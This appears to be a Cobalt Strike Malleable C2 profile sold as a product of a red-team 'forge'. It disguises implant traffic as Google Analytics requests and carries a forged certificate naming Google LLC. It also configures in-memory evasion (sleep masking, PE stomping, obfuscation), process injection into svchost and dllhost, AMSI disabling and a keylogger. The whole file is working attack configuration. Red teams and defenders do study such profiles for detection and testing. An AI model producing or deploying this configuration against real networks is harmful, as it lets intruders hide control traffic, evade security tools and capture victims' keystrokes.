# =====================================================================
# Profile: Google Analytics & Tag Manager - STEALTH
# Generated & Validated by Ostad Red Team Forge Malleable C2 Engine
# Founder & Director: Ostad Rezaul Karim (Top 1% Red Teamer)
# =====================================================================

set sample_name "update_iU7SUi.exe";
set sleeptime "5000";
set jitter "25";
set maxget "1048576";
set data_jitter "11";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0";
set pipename "samr_##";
set pipename_stager "status_wmIS##";


http-get {
    set uri "/j/collect" "/analytics/v2/measurement";

    client {
        header "Host" "www.google-analytics.com";
        header "Accept" "image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Cache-Control" "no-cache";
        header "Sec-Fetch-Dest" "image";
        metadata {
            mask;
            base64url;
            prepend "sid=";
            header "Cookie";
        }
    }

    server {
        header "Server" "gws";
        header "Content-Type" "application/json";
        header "Cache-Control" "no-cache, no-store, must-revalidate";
        output {
            mask;
            base64;
            print;
        }
    }
}

http-post {
    set uri "/gtm/debug/sync" "/g/collect/batch";
    set verb "POST";

    client {
        header "Host" "www.google-analytics.com";
        header "Accept-Language" "en-US,en;q=0.9";
        header "Cache-Control" "no-cache";
        header "Sec-Fetch-Dest" "image";
        header "Content-Type" "application/json";
        id {
            mask;
            base64url;
            parameter "sync_id";
        }
        output {
            mask;
            base64url;
            print;
        }
    }

    server {
        header "Server" "gws";
        header "Content-Type" "application/json";
        output {
            mask;
            base64;
            print;
        }
    }
}

stage {
    set checksum "0";
    set cleanup "true";
    set sleep_mask "true";
    set smartinject "true";
    set stomppe "true";
    set obfuscate "true";
    set userwx "false";
    set magic_mz_x86 "MZGH";
    set magic_mz_x64 "MZGH";
    set magic_pe "PK";
    transform-x86 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    }
}

process-inject {
    set allocator "VirtualAllocEx";
    set min_alloc "16384";
    set startrwx "false";
    set userwx "false";
    execute {
        CreateThread;
        SetThreadContext;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

post-ex {
    set spawnto_x86 "%windir%\syswow64\svchost.exe";
    set spawnto_x64 "%windir%\sysnative\dllhost.exe";
    set amsi_disable "true";
    set keylogger "GetAsyncKeyState";
}

https-certificate {
    set CN "google-analytics.com";
    set O "Google LLC";
    set OU "Google Infrastructure";
    set C "US";
    set ST "California";
    set L "Mountain View";
    set validity "436";
}
